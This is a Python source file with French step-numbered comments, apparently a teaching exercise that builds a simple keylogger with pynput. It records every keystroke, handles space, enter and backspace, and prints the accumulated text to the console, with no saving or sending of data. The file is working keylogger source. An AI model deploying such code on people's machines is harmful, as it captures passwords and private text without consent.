import pynput
import pynput.keyboard


# 10.1. Déclarez une variable globale log de type string
log = ""


# Créer la méthode processkeys(key) qui prend comme paramètre une touche du clavier sur laquelle on a appuyé, affiche sa valeur.
def processkeys(key):
    global log  # Permet de modifier la variable globale
    
    # 10.3. On utilise try...except car key.char n'existe que pour les caractères normaux
    try:
        # 10.2. Pour chaque touche pressée, concaténer le caractère dans la variable log
        log += key.char
        print(log)  # Afficher le log complet
    except AttributeError:
        # 10.4. Gérer les espaces, retours chariot et backspaces
        if key == pynput.keyboard.Key.space:
            log += " "
            print(log)
        elif key == pynput.keyboard.Key.enter:
            log += "\n"
            print(log)
        elif key == pynput.keyboard.Key.backspace:
            # Supprimer le dernier caractère
            log = log[:-1]
            print(log)
        # 10.5. Pour tout le reste (flèches, Ctrl, Alt, etc.), remplacer par chaîne vide
        else:
            pass  # Ne rien ajouter au log


# 6.1. Déclarez une variable keyboard_listener qui va contenir le résultat de l'appel de la fonction pynput.keyboard.Listener()
keyboard_listener = pynput.keyboard.Listener(on_press=processkeys)


# Créer la méthode start_keylogger() qui démarre l'écouteur de clavier.
def start_keylogger():
    # 7. Ajouter les lignes de code suivantes
    with keyboard_listener:
        keyboard_listener.join()


if __name__ == "__main__":
    start_keylogger()

